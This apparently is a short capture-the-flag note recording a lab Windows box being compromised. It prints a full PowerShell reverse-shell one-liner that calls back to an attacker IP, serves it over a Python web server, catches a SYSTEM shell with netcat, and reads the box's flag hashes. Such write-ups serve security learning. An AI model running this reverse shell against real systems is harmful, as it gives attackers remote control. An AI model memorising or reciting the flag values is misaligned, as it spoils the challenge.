
revsh2.ps1
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

![[Images/Pasted image 20250513231155.png]]

shared file was downloaded
```sh
┌──(kali㉿proxli)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.95 - - [13/May/2025 23:09:22] "GET /shells/revsh2.ps1 HTTP/1.1" 200 -
```

```sh
┌──(kali㉿proxli)-[~/shells]
└─$ nc -lnvp 443                                                                   
listening on [any] 443 ...

whoami
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.95] 49194
nt authority\system
PS C:\apache-tomcat-7.0.88> 
```

```sh
PS C:\users\administrator\desktop> cd flags
PS C:\users\administrator\desktop\flags> ls


    Directory: C:\users\administrator\desktop\flags


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         6/19/2018   7:11 AM         88 2 for the price of 1.txt          


PS C:\users\administrator\desktop\flags> type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
